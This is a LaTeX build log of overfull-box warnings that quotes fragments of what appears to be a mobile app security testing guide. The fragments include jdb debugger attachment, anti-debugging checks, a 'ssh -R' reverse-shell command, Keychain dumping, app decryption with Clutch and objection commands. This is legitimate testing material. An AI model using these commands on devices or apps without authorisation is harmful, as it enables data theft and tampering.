\TU/SourceCodePro(6)/m/n/10.95 app.package.attacksurface \TU/SourceSansPro(0)/m
/n/10.95 also displays information about IPC components exported by
[452]
Overfull \hbox (969.35915pt too wide) in paragraph at lines 26105--26105
[]\TU/SourceCodePro(6)/m/n/10.95 uid=10084(u0_a84) gid=10084(u0_a84) groups=100
83(u0_a83),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(
net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:untrusted_
app:s0:c512,c768[] 

Overfull \hbox (4.66437pt too wide) in paragraph at lines 26148--26148
 []\TU/SourceCodePro(6)/m/n/10.95 $ jdb -connect com.sun.jdi.SocketAttach:hostn
ame=localhost,port=55555[] 
[453]
Overfull \hbox (299.21928pt too wide) in paragraph at lines 26199--26199
[]\TU/SourceCodePro(6)/m/n/10.95 export $NM = $ANDROID_NDK_DIR/toolchains/arm-l
inux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm[] 

Overfull \hbox (286.07933pt too wide) in paragraph at lines 26206--26206
[]\TU/SourceCodePro(6)/m/n/10.95 /tmp/toolchains/arm-linux-androideabi-4.9/preb
uilt/darwin-x86_64/bin/arm-linux-androideabi-nm: libfoo.so: no symbols[] 
[454] [455]
Overfull \hbox (8.12468pt too wide) in paragraph at lines 26283--26287
[]\TU/SourceSansPro(0)/m/n/10.95 To determine whether \TU/SourceCodePro(6)/m/n/
10.95 StrictMode \TU/SourceSansPro(0)/m/n/10.95 is enabled, you can look for th
e \TU/SourceCodePro(6)/m/n/10.95 StrictMode.setThreadPolicy
[456] [457] [458]
Overfull \hbox (36.4194pt too wide) in paragraph at lines 26485--26485
[]    \TU/SourceCodePro(6)/m/n/10.95 id "com.github.hierynomus.license-report" 
version"{license_plugin_version}"[] 
[459]
Overfull \hbox (68.55766pt too wide) in paragraph at lines 26565--26577
[]\TU/SourceSansPro(0)/m/n/10.95 Plan for standard \TU/SourceCodePro(6)/m/n/10.
95 RuntimeException\TU/SourceSansPro(0)/m/n/10.95 s (e.g.\TU/SourceCodePro(6)/m
/n/10.95 NullPointerException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro
(6)/m/n/10.95 IndexOutOfBoundsException\TU/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 3713) in paragraph at lines 26565--26577
\TU/SourceCodePro(6)/m/n/10.95 ActivityNotFoundException\TU/SourceSansPro(0)/m/
n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 CancellationException\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 SQLException\TU/SourceSansPro(0)
/m/n/10.95 ) by cre-
[460] [461] [462] [463]
Overfull \hbox (1.37952pt too wide) in paragraph at lines 26850--26850
[]            \TU/SourceCodePro(6)/m/n/10.95 // Includes the default ProGuard r
ules files that are packaged with[] 

Overfull \hbox (3.56953pt too wide) in paragraph at lines 26850--26850
[]            \TU/SourceCodePro(6)/m/n/10.95 // the Android Gradle plugin. To l
earn more, go to the section about[] 
[464] [465]
Underfull \hbox (badness 10000) in paragraph at lines 26966--26969
[]\TU/SourceSansPro(0)/m/n/10.95 Drozer - [][]$[][][][][] [] [] [] [][][][] [] 
[][][][][][][][][][][][][][][] [] [][][] [] [][][][][][] [] [][][][][][][][][] 
[] [][][][] [][] [][][][][][] [][] [][][][] [][] [][][][][] [][] [][][][] [][] 
[][] [][]
[466]
Underfull \hbox (badness 1226) in paragraph at lines 27019--27021
[]\TU/SourceSansPro(0)/m/n/10.95 APK signature scheme with key rotation - [][]$
[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][
] [] [][][][][][][][] [] [][][] []
[467] [468]
Underfull \hbox (badness 10000) in paragraph at lines 27167--27171
[]\TU/SourceSansPro(0)/m/n/10.95 Trust APK information (\TU/SourceCodePro(6)/m/
n/10.95 apkPackageName\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n
/10.95 apkCertificateDigestSha256 \TU/SourceSansPro(0)/m/n/10.95 and
[469]
Underfull \hbox (badness 1478) in paragraph at lines 27207--27211
[]\TU/SourceSansPro(0)/m/n/10.95 Follow this [][]checklist[][] to ensure that y
ou’ve completed each of the steps needed to integrate the
[470]
Overfull \hbox (59.78313pt too wide) in paragraph at lines 27289--27295
[]\TU/SourceSansPro(0)/m/n/10.95 Another way of determining whether \TU/SourceC
odePro(6)/m/n/10.95 su \TU/SourceSansPro(0)/m/n/10.95 exists is attempting to e
xecute it through the \TU/SourceCodePro(6)/m/n/10.95 Runtime.getRuntime.exec
[471]
Underfull \hbox (badness 2608) in paragraph at lines 27298--27306
\TU/SourceSansPro(0)/m/n/10.95 the \TU/SourceCodePro(6)/m/n/10.95 ActivityManag
er.getRunningAppProcesses \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(
6)/m/n/10.95 manager.getRunningServices
[472] [473] [474]
Overfull \hbox (26.04254pt too wide) in paragraph at lines 27517--27521
[]\TU/SourceSansPro(0)/m/n/10.95 While this might be pretty obvious to circumve
nt for a reverse engineer, you can use \TU/SourceCodePro(6)/m/n/10.95 isDebugge
rConnected
[475] [476]
Overfull \hbox (96.55685pt too wide) in paragraph at lines 27631--27635
[]\TU/SourceSansPro(0)/m/n/10.95 One way to overwrite the method pointers is to
 overwrite the address of the function \TU/SourceCodePro(6)/m/n/10.95 jdwpAdbSt
ate::ProcessIncoming
[477] [478] [479]
Overfull \hbox (36.41943pt too wide) in paragraph at lines 27802--27802
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a151   18190 201   1535844 54908 ffffffff b
6e0f124 S sg.vantagepoint.antidebug[] 

Overfull \hbox (40.79942pt too wide) in paragraph at lines 27802--27802
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a151   18224 18190 1495180 35824 c019a3ac b
6e0ee5c S sg.vantagepoint.antidebug[] 
[480] [481]
Overfull \hbox (42.98943pt too wide) in paragraph at lines 27924--27924
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a152   20267 201   1552508 56796 ffffffff b
6e0f124 S sg.vantagepoint.anti-debug[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 27924--27924
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a152   20301 20267 1495192 33980 c019a3ac b
6e0ee5c S sg.vantagepoint.anti-debug[] 
[482] [483] [484]
Underfull \hbox (badness 6445) in paragraph at lines 28109--28113
[]\TU/SourceSansPro(0)/m/n/10.95 The following [][]sample implementation from t
he Android Cracking blog[][] calculates a CRC over
[485] [486] [487] [488] [489] [490]
Overfull \hbox (12.87714pt too wide) in paragraph at lines 28454--28460
\TU/SourceSansPro(0)/m/n/10.95 (e.g. [][]GET_SIGNING_CERTIFICATES[][] 

Overfull \hbox (23.40738pt too wide) in paragraph at lines 28509--28515
\TU/SourceCodePro(6)/m/n/10.95 Runtime.getRuntime().exec 
[491] [492] [493] [494]
Overfull \hbox (5.75964pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getDeviceId()                
          0[]s                     emulator[] 

Overfull \hbox (25.4696pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getLine1 Number()            
          155552155               emulator[] 

Overfull \hbox (80.21959pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkCountryIso()       
          us                      possibly emulator[] 

Overfull \hbox (64.88963pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkType()             
          3                       possibly emulator[] 

Overfull \hbox (110.87949pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkOperator().substrin
g(0,3)    310                     possibly emulator[] 

Overfull \hbox (106.49951pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkOperator().substrin
g(3)      260                     possibly emulator[] 

Overfull \hbox (60.50964pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getPhoneType()               
          1                       possibly emulator[] 

Overfull \hbox (71.45963pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSimCountryIso()           
          us                      possibly emulator[] 

Overfull \hbox (58.3195pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSimSerial Number()        
          89014103211118510720    emulator[] 

Overfull \hbox (40.79956pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSubscriberId()            
          310260000000000         emulator[] 

Overfull \hbox (38.60956pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getVoiceMailNumber()         
          15552175049             emulator[] 
[495]
Overfull \hbox (63.5245pt too wide) in paragraph at lines 28777--28777
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"com.android.internal.os.ZygoteInit"[])) 
[496]
Overfull \hbox (63.5245pt too wide) in paragraph at lines 28787--28787
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"de.robv.android.xposed.XposedBridge"[]) 

Overfull \hbox (63.5245pt too wide) in paragraph at lines 28791--28791
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"de.robv.android.xposed.XposedBridge"[]) 
[497] [498]
Overfull \hbox (156.98944pt too wide) in paragraph at lines 28940--28940
\TU/SourceCodePro(6)/m/it/10 <https://developer.android.com/reference/android/s
ecurity/keystore/KeyGenParameterSpec.html>[]|  
[499]
Overfull \hbox (156.98944pt too wide) in paragraph at lines 28967--28967
\TU/SourceCodePro(6)/m/it/10 <https://developer.android.com/reference/android/s
ecurity/keystore/KeyGenParameterSpec.html>[]|  
[500]
Underfull \hbox (badness 10000) in paragraph at lines 29068--29070
[]\TU/SourceCodePro(6)/m/n/10.95 Settings.Secure.bluetooth_address\TU/SourceSan
sPro(0)/m/n/10.95 , unless the system permission LO-
[501]
Overfull \hbox (224.53432pt too wide) in paragraph at lines 29092--29096
\TU/SourceCodePro(6)/m/n/10.95 Build.Serial\TU/SourceSansPro(0)/m/n/10.95 . The
 file should contain the permission \TU/SourceCodePro(6)/m/n/10.95 <uses-permis
sion android:name="android.permission.READ_PHONE_STATE"

Overfull \hbox (7.42747pt too wide) in paragraph at lines 29098--29100
[]\TU/SourceSansPro(0)/m/n/10.95 Apps for Android 8.0 (API level 26) will get t
he result “UNKNOWN” when they request \TU/SourceCodePro(6)/m/n/10.95 Build.Seri
al\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (2.6277pt too wide) in paragraph at lines 29134--29138
[]\TU/SourceSansPro(0)/m/n/10.95 Copy the contents of \TU/SourceCodePro(6)/m/n/
10.95 /data/data/<your appid>/cache \TU/SourceSansPro(0)/m/n/10.95 and \TU/Sour
ceCodePro(6)/m/n/10.95 shared-preferences

Overfull \hbox (51.87105pt too wide) in paragraph at lines 29152--29155
[]\TU/SourceSansPro(0)/m/n/10.95 Execute \TU/SourceCodePro(6)/m/n/10.95 run-as 
<your app-id>\TU/SourceSansPro(0)/m/n/10.95 . Your app-id is the package descri
bed in \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml\TU/SourceSansPro(0)/m
/n/10.95 . 
[502] [503]
Overfull \hbox (30.89949pt too wide) in paragraph at lines 29234--29234
\TU/SourceCodePro(6)/m/n/10 iid.[]getToken[](tokenItem.[]authorizedEntity[],tok
enItem.[]scope[],tokenItem.[]options[]);|  
[504] [505]
Underfull \hbox (badness 10000) in paragraph at lines 29388--29392
[]\TU/SourceCodePro(6)/m/n/10.95 Settings.Secure.bluetooth_address \TU/SourceSa
nsPro(0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 WifiInfo.getMacAddress \TU
/SourceSansPro(0)/m/n/10.95 from

Underfull \hbox (badness 1112) in paragraph at lines 29407--29411
[]\TU/SourceSansPro(0)/m/n/10.95 To make sure that the identifiers can be used,
 check \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(0)/
m/n/10.95 for usage of the

Underfull \hbox (badness 2781) in paragraph at lines 29407--29411
\TU/SourceSansPro(0)/m/n/10.95 IMEI and \TU/SourceCodePro(6)/m/n/10.95 Build.Se
rial\TU/SourceSansPro(0)/m/n/10.95 . The manifest should contain the permission
 \TU/SourceCodePro(6)/m/n/10.95 <uses-permission
[506]
Underfull \hbox (badness 2253) in paragraph at lines 29499--29501
[]\TU/SourceSansPro(0)/m/n/10.95 SafetyNet Attestation API - Quota Request - []
[]$[][][][][] [] [] [] [][][][][][][] [] [][][][][][] [] [][][] [] [][][][][][]
[][][][] [] [][][][][][][] [][]
[507] [508] [509]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d4e80dd1320b9b3dc91c94b0608a477026670825.
png" > [510] [511] [512] [513]
Overfull \hbox (7.5151pt too wide) in paragraph at lines 29770--29775
[]\TU/SourceSansPro(0)/m/n/10.95 The app process is restricted to its own direc
tory (under /var/mobile/Containers/Bundle/Application/
[514]
Underfull \hbox (badness 1137) in paragraph at lines 29867--29872
[]\TU/SourceCodePro(6)/m/n/10.95 /iTunesMetadata.plist \TU/SourceSansPro(0)/m/n
/10.95 contains various bits of information, including the developer’s
[515]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fa9295f5a7912d06f00eca6564a177c1bf1338c5.
png" > [516] [517] [518]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cf54b9aca2296ed3eaa6ecf814484f24668e5af6.
png" > [519] [520] [521] [522] [523] [524] [525] [526] [527]
Overfull \hbox (84.59961pt too wide) in paragraph at lines 30737--30737
[]   \TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC     ARM         V7  0x00     EXECU
TE    39       5016   NOUNDEFS DYLDLINK TWOLEVEL PIE[] 

Overfull \hbox (97.73956pt too wide) in paragraph at lines 30737--30737
[]\TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC_64   ARM64        ALL  0x00     EXECU
TE    38       5728   NOUNDEFS DYLDLINK TWOLEVEL PIE[] 

Overfull \hbox (145.91933pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 $ dsdump --objc --color --verbose=5 --arch arm
64 --defined [APP_MAIN_BINARY_FILE] > /tmp/OBJC.txt[] 

Overfull \hbox (73.64946pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 # Dump the Swift type descriptors to a tempora
ry file if the app is implemented in Swift[] 

Overfull \hbox (159.05933pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 $ dsdump --swift --color --verbose=5 --arch ar
m64 --defined [APP_MAIN_BINARY_FILE] > /tmp/SWIFT.txt[] 

Overfull \hbox (49.5594pt too wide) in paragraph at lines 30767--30767
[]\TU/SourceCodePro(6)/m/n/10.95 $ docker run -it -p 8000:8000 opensecurity/mob
ile-security-framework-mobsf:latest[] 
[528]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a70d91db8c881c205f3831ecfd5d5432ce6c4610.
png" > [529] [530]
Overfull \hbox (73.6494pt too wide) in paragraph at lines 30914--30914
[]\TU/SourceCodePro(6)/m/n/10.95 OWASP.iGoat-Swift on (iPhone: 12.0) [usb] # io
s hooking list class_methods <ClassName>[] 

Overfull \hbox (10.1394pt too wide) in paragraph at lines 30950--30950
[]\TU/SourceCodePro(6)/m/n/10.95 $ objection patchipa --source my-app.ipa --cod
esign-signature 0C2E8200Dxxxx[] 
[531]
Overfull \hbox (165.62943pt too wide) in paragraph at lines 31000--31000
[]\TU/SourceCodePro(6)/m/n/10.95 # Dump the Keychain, including access modifier
s. The result will be written to the host in myfile.json[] 
[532]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fe6365453719e80590d3afce7e4cc779feb735be.
png" > [533]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/941c3323ce1e22f1181dbd2b8ebcd856dd4552a7.
png" > [534] [535] [536]
Overfull \hbox (60.21677pt too wide) in paragraph at lines 31220--31222
[]\TU/SourceSansPro(0)/m/n/10.95 Opening a reverse shell over SSH can be done b
y running the command \TU/SourceCodePro(6)/m/n/10.95 ssh -R <remote_port>:local
host:22

Overfull \hbox (321.11931pt too wide) in paragraph at lines 31258--31258
[]\TU/SourceCodePro(6)/m/n/10.95 iPhone:~ root# tar czvf /tmp/data.tgz /private
/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693[] 

[537]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/47ac539e21259f375afeadf39e3185e10750e8d0.
png" > [538]
Overfull \hbox (242.27933pt too wide) in paragraph at lines 31308--31308
[]\TU/SourceCodePro(6)/m/n/10.95 Current directory: /var/containers/Bundle/Appl
ication/DABF849D-493E-464C-B66B-B8B6C53A4E76/org.owasp.MSTG.app[] 

Overfull \hbox (382.4393pt too wide) in paragraph at lines 31316--31316
[]\TU/SourceCodePro(6)/m/n/10.95 org.owasp.MSTG on (iPhone: 10.3.3) [usb] # cd 
/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Do
cuments[] 

Overfull \hbox (95.54933pt too wide) in paragraph at lines 31316--31316
[]\TU/SourceCodePro(6)/m/n/10.95 /var/mobile/Containers/Data/Application/72C7AA
FB-1D75-4FBA-9D83-D8B4A2D44133/Documents[] 

Overfull \hbox (215.99937pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 org.owasp.MSTG on (iPhone: 10.3.3) [usb] # fil
e download .com.apple.mobile_container_manager.metadata.plist[] 

Overfull \hbox (791.96916pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 Downloading /var/mobile/Containers/Data/Applic
ation/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.
metadata.plist to .com.apple.mobile_container_manager.metadata.plist[] 

Overfull \hbox (868.61916pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 Successfully downloaded /var/mobile/Containers
/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_contai
ner_manager.metadata.plist to .com.apple.mobile_container_manager.metadata.plis
t[] 
[539]
Overfull \hbox (246.65932pt too wide) in paragraph at lines 31348--31348
[]\TU/SourceCodePro(6)/m/n/10.95 itms-services://?action=download-manifest&url=
https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist[] 

Overfull \hbox (467.84929pt too wide) in paragraph at lines 31362--31362
[]\TU/SourceCodePro(6)/m/n/10.95 # itms-services -u "itms-services://?action=do
wnload-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.p
list" -o - > out.ipa[] 

Overfull \hbox (82.40947pt too wide) in paragraph at lines 31424--31424
[]\TU/SourceCodePro(6)/m/n/10.95 //     Generated by class-dump 3.5 (64 bit) (D
ebug version compiled Jun  9 2015 22:53:21).[] 

Overfull \hbox (45.17947pt too wide) in paragraph at lines 31424--31424
[]\TU/SourceCodePro(6)/m/n/10.95 //     class-dump is Copyright (C) 1997-1998, 
2000-2001, 2004-2014 by Steve Nygard.[] 
[540]
Overfull \hbox (56.12941pt too wide) in paragraph at lines 31449--31449
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:16:57.807 Clutch[2449:440427] co
mmand: Prints installed applications[] 
[541]
Overfull \hbox (108.68944pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:19:28.460 Clutch[2450:440574] co
mmand: Dump specified bundleID into .ipa file[] 

Overfull \hbox (402.14938pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 ph.telegra.Telegraph contains watchOS 2 compat
ible application. It[]s not possible to dump watchOS 2 apps with Clutch (null) 
at this moment.[] 

Overfull \hbox (159.05942pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:19:29.825 clutch[2465:440618] co
mmand: Only dump binary files from specified bundleID[] 

Overfull \hbox (119.63936pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 DONE: /private/var/mobile/Documents/Dumped/ph.
telegra.Telegraph-iOS9.0-(Clutch-(null)).ipa[] 

Overfull \hbox (82.40947pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 //     Generated by class-dump 3.5 (64 bit) (D
ebug version compiled Jun  9 2015 22:53:21).[] 

Overfull \hbox (45.17947pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 //     class-dump is Copyright (C) 1997-1998, 
2000-2001, 2004-2014 by Steve Nygard.[] 

Overfull \hbox (56.12943pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 typedef void (^CDUnknownBlockType)(void); // r
eturn type and parameters are unknown[] 
[542] [543]
Overfull \hbox (399.95929pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 start dump /private/var/containers/Bundle/Appl
ication/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftsi
md.dylib[] 

Overfull \hbox (7.9494pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 libswiftsimd.dylib.fid: 100%|██████████| 343k/
343k [00:00<00:00, 1.54MB/s][] 

Overfull \hbox (426.23929pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 start dump /private/var/containers/Bundle/Appl
ication/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftCo
reData.dylib[] 

Overfull \hbox (40.79938pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 libswiftCoreData.dylib.fid: 100%|██████████| 8
2.5k/82.5k [00:00<00:00, 477kB/s][] 
[544]
Overfull \hbox (117.44943pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 # The following command will show detailed inf
ormation about the iOS device connected via USB.[] 

Overfull \hbox (82.40936pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 WARNING: could not locate Payload/iGoat-Swift.
app/SC_Info/iGoat-Swift.sinf in archive![] 

Overfull \hbox (522.5994pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 # The following command will start the app in 
debug mode, by providing the bundle name. The bundle name can be found in the p
revious command after "Installing".[] 
[545] [546] [547]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/10a4f9e98e7c4b14b4396229660b6b6c0fe7f30d.
png" > [548] [549]
Overfull \hbox (102.94426pt too wide) in paragraph at lines 31941--31946
[]\TU/SourceSansPro(0)/m/n/10.95 Exported/imported \TU/SourceSansPro(0)/m/it/10
.95 custom document types\TU/SourceSansPro(0)/m/n/10.95 : \TU/SourceCodePro(6)/
m/n/10.95 UTExportedTypeDeclarations\TU/SourceSansPro(0)/m/n/10.95 /\TU/SourceC
odePro(6)/m/n/10.95 UTImportedTypeDeclarations
[550]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/67df79153b351160650e3671f95ec4d358cdb42e.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/66f4454a50ab09521142216735c12da384b6ebe1.
png" > [551]
Overfull \hbox (12.32903pt too wide) in paragraph at lines 32008--32008
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ...
  ----------------------------[] 
[552]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/24668459a85228c7fd3205ac60e616120c5fa265.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5a8b4b5da9d5f0e362687fe04a7d34d52f468738.
png" > [553]
Overfull \hbox (99.92937pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Bundle: /private/var/containers/Bundle/Applica
tion/3ADAF47D-A734-49FA-B274-FBCA66589E67[] 

Overfull \hbox (237.89934pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Application: /private/var/containers/Bundle/Ap
plication/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app[] 

Overfull \hbox (119.63934pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Data: /private/var/mobile/Containers/Data/Appl
ication/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693[] 
[554]
Overfull \hbox (248.84866pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 -----------------  ---------------------------
----------------------------------------------------------------[] 

Overfull \hbox (207.23938pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 BundlePath         /var/containers/Bundle/Appl
ication/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app[] 

Overfull \hbox (244.46931pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 CachesDirectory    /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches[] 

Overfull \hbox (215.99931pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 DocumentDirectory  /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents[] 

Overfull \hbox (200.66934pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 LibraryDirectory   /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library[] 

Overfull \hbox (134.17004pt too wide) in paragraph at lines 32098--32101
[]\TU/SourceSansPro(0)/m/n/10.95 The Bundle directory (\TU/SourceCodePro(6)/m/n
/10.95 /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/
\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (155.42393pt too wide) in paragraph at lines 32101--32103
[]\TU/SourceSansPro(0)/m/n/10.95 The Data directory (\TU/SourceCodePro(6)/m/n/1
0.95 /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB06
93/\TU/SourceSansPro(0)/m/n/10.95 ). 
[555]
Overfull \hbox (120.74524pt too wide) in paragraph at lines 32229--32232
\TU/SourceSansPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 /var/containers/
Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app\TU/Sour
ceSansPro(0)/m/n/10.95 ): 

Overfull \hbox (78.02895pt too wide) in paragraph at lines 32269--32269
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ...
  --------------------------------------[] 
[556]
Overfull \hbox (14.51958pt too wide) in paragraph at lines 32269--32269
[]\TU/SourceCodePro(6)/m/n/10.95 Regular           420  None                ...
  archived-expanded-entitlements.xcent[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/64430942f835261b3d5dda4b1a015f93a37444a5.
png" > [557]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/527c1334c8624ced36aea25f510ec6b9d3af0927.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.
png" > [558]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/277e652a44a38783e21eb7c8b9f08bc1ec9ea888.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/80296790f84b6f892c5600d3679bf94df59a5303.
png" > [559]
Overfull \hbox (104.3094pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone chmod[9705] <Notice>: M
S:Notice: Injecting: (null) [chmod] (1556.00)[] 

Overfull \hbox (143.7294pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone readlink[9706] <Notice>
: MS:Notice: Injecting: (null) [readlink] (1556.00)[] 

Overfull \hbox (64.88942pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:N
otice: Injecting: (null) [rm] (1556.00)[] 

Overfull \hbox (104.3094pt too wide) in paragraph at lines 32363--32363
[]\TU/SourceCodePro(6)/m/n/10.95 Jun  7 13:42:14 iPhone touch[9708] <Notice>: M
S:Notice: Injecting: (null) [touch] (1556.00)[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/962e8ecc0cf25f4714db0758530228fcd0c6d54e.
png" > [560]
Overfull \hbox (3.56946pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 Note: You may be asked to authenticate using t
he devices passcode or TouchID[] 
[561]
Overfull \hbox (187.52988pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 Created                    Accessible         
             ACL    Type      Account              Service                     
